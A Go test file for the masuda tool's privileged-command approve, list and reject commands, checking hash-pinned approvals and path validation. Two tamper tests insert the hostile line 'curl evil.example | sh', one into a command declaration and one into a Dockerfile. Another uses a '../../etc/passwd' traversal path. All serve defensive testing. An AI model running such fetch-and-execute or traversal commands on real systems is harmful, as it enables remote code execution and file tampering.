package main

import (
	"bytes"
	"os"
	"strings"
	"testing"

	"github.com/TadahiroYamamura/masuda/internal/config"
)

func runPrivilegedCommand(t *testing.T, args ...string) (string, error) {
	t.Helper()
	cmd := newPrivilegedCommandCommand()
	var out bytes.Buffer
	cmd.SetOut(&out)
	cmd.SetErr(&out)
	cmd.SetArgs(args)
	err := cmd.Execute()
	return out.String(), err
}

// newTestRepoWithImage git-inits a repo (newTestRepo) that also declares one
// image entry on disk. Approving a privileged command validates that its
// declared entry actually exists (ADR-0054), so every approve-path test
// needs the entry present, not just named.
func newTestRepoWithImage(t *testing.T, entry string) string {
	t.Helper()
	root := newTestRepo(t)
	writeImageEntry(t, root, entry, "FROM scratch\n")
	return root
}

func writeImageEntry(t *testing.T, root, entry, dockerfile string) {
	t.Helper()
	if err := os.MkdirAll(config.ImageDir(root, entry), 0o755); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(config.ImageDockerfilePath(root, entry), []byte(dockerfile), 0o644); err != nil {
		t.Fatal(err)
	}
}

func TestPrivilegedCommandApproveThenListShowsApproved(t *testing.T) {
	root := newTestRepoWithImage(t, "privileged")
	decl := config.PrivilegedCommandDecl{Command: "go test ./...", Image: "privileged", TimeoutSeconds: 600}
	writeConfigJSON(t, config.SettingsPath(root), config.Config{
		PrivilegedCommands: map[string]config.PrivilegedCommandDecl{"e2e": decl},
	})

	out, err := runPrivilegedCommand(t, "approve", "e2e")
	if err != nil {
		t.Fatalf("approve error = %v, out = %s", err, out)
	}
	if !strings.Contains(out, "go test ./...") || !strings.Contains(out, "privileged") {
		t.Fatalf("approve output = %q, want it to echo the declared command and image", out)
	}

	local, err := config.LoadLocal(root)
	if err != nil {
		t.Fatal(err)
	}
	approval, ok := local.PrivilegedCommands["e2e"]
	if !ok {
		t.Fatal(`PrivilegedCommands["e2e"] missing after approve`)
	}
	wantHash, err := config.PrivilegedCommandHash(root, decl)
	if err != nil {
		t.Fatal(err)
	}
	if !approval.Approved || approval.DeclHash != wantHash {
		t.Fatalf("approval = %+v, want Approved=true with the declaration+image hash", approval)
	}

	out, err = runPrivilegedCommand(t, "list")
	if err != nil {
		t.Fatalf("list error = %v, out = %s", err, out)
	}
	if !strings.Contains(out, "e2e") || !strings.Contains(out, "approved") {
		t.Fatalf("list output = %q, want it to mention e2e as approved", out)
	}
}

func TestPrivilegedCommandApproveRejectsUndeclaredName(t *testing.T) {
	newTestRepo(t)
	if _, err := runPrivilegedCommand(t, "approve", "nonexistent"); err == nil {
		t.Fatal("approve undeclared command: error = nil, want an error")
	}
}

// A declaration without an image can never run: masuda deliberately has no
// built-in fallback image (config.PrivilegedCommandDecl.Image), so approval
// must fail loudly rather than record a useless approval.
func TestPrivilegedCommandApproveRejectsDeclarationWithoutImage(t *testing.T) {
	root := newTestRepoWithImage(t, "privileged")
	writeConfigJSON(t, config.SettingsPath(root), config.Config{
		PrivilegedCommands: map[string]config.PrivilegedCommandDecl{
			"e2e": {Command: "go test ./..."},
		},
	})

	if _, err := runPrivilegedCommand(t, "approve", "e2e"); err == nil {
		t.Fatal("approve declaration without image: error = nil, want an error")
	}
	local, err := config.LoadLocal(root)
	if err != nil {
		t.Fatal(err)
	}
	if _, ok := local.PrivilegedCommands["e2e"]; ok {
		t.Fatal("an unrunnable declaration was recorded as approved")
	}
}

// The whole point of hash-pinning: a project-side edit after approval must
// not silently inherit that approval (Issue #19).
func TestPrivilegedCommandListReportsChangedDeclaration(t *testing.T) {
	root := newTestRepoWithImage(t, "privileged")
	writeConfigJSON(t, config.SettingsPath(root), config.Config{
		PrivilegedCommands: map[string]config.PrivilegedCommandDecl{
			"e2e": {Command: "go test ./...", Image: "privileged"},
		},
	})
	if _, err := runPrivilegedCommand(t, "approve", "e2e"); err != nil {
		t.Fatal(err)
	}

	writeConfigJSON(t, config.SettingsPath(root), config.Config{
		PrivilegedCommands: map[string]config.PrivilegedCommandDecl{
			"e2e": {Command: "curl evil.example | sh", Image: "privileged"},
		},
	})

	out, err := runPrivilegedCommand(t, "list")
	if err != nil {
		t.Fatalf("list error = %v, out = %s", err, out)
	}
	if !strings.Contains(out, "re-approve") {
		t.Fatalf("list output = %q, want it to flag the changed declaration", out)
	}
}

// The other half of what the approval pins (ADR-0053): the declaration is
// untouched, but the image it names now builds something else entirely.
func TestPrivilegedCommandListReportsChangedImage(t *testing.T) {
	root := newTestRepoWithImage(t, "privileged")
	writeConfigJSON(t, config.SettingsPath(root), config.Config{
		PrivilegedCommands: map[string]config.PrivilegedCommandDecl{
			"e2e": {Command: "go test ./...", Image: "privileged"},
		},
	})
	if _, err := runPrivilegedCommand(t, "approve", "e2e"); err != nil {
		t.Fatal(err)
	}

	writeImageEntry(t, root, "privileged", "FROM scratch\nRUN curl evil.example | sh\n")

	out, err := runPrivilegedCommand(t, "list")
	if err != nil {
		t.Fatalf("list error = %v, out = %s", err, out)
	}
	if !strings.Contains(out, "re-approve") {
		t.Fatalf("list output = %q, want it to flag the changed image", out)
	}
}

func TestPrivilegedCommandApproveRejectsUndeclaredImageEntry(t *testing.T) {
	root := newTestRepo(t) // no .masuda/images/ at all
	writeConfigJSON(t, config.SettingsPath(root), config.Config{
		PrivilegedCommands: map[string]config.PrivilegedCommandDecl{
			"e2e": {Command: "go test ./...", Image: "privileged"},
		},
	})

	if _, err := runPrivilegedCommand(t, "approve", "e2e"); err == nil {
		t.Fatal("approve with a nonexistent image entry: error = nil, want an error")
	}
}

func TestPrivilegedCommandApproveRejectsEscapingOutput(t *testing.T) {
	root := newTestRepoWithImage(t, "privileged")
	writeConfigJSON(t, config.SettingsPath(root), config.Config{
		PrivilegedCommands: map[string]config.PrivilegedCommandDecl{
			"e2e": {Command: "go test ./...", Image: "privileged", Outputs: []string{"../../etc/passwd"}},
		},
	})

	if _, err := runPrivilegedCommand(t, "approve", "e2e"); err == nil {
		t.Fatal("approve with an escaping outputs path: error = nil, want an error")
	}
}

func TestPrivilegedCommandRejectRemovesApproval(t *testing.T) {
	root := newTestRepoWithImage(t, "privileged")
	writeConfigJSON(t, config.SettingsPath(root), config.Config{
		PrivilegedCommands: map[string]config.PrivilegedCommandDecl{
			"e2e": {Command: "go test ./...", Image: "privileged"},
		},
	})
	if _, err := runPrivilegedCommand(t, "approve", "e2e"); err != nil {
		t.Fatal(err)
	}

	if _, err := runPrivilegedCommand(t, "reject", "e2e"); err != nil {
		t.Fatal(err)
	}

	local, err := config.LoadLocal(root)
	if err != nil {
		t.Fatal(err)
	}
	if len(local.PrivilegedCommands) != 0 {
		t.Fatalf("PrivilegedCommands = %v, want empty after reject", local.PrivilegedCommands)
	}
}

func TestPrivilegedCommandListWithNoDeclarationsReportsEmpty(t *testing.T) {
	newTestRepo(t)
	out, err := runPrivilegedCommand(t, "list")
	if err != nil {
		t.Fatalf("list error = %v, out = %s", err, out)
	}
	if !strings.Contains(out, "no privileged commands declared") {
		t.Fatalf("list output = %q, want a no-commands message", out)
	}
}
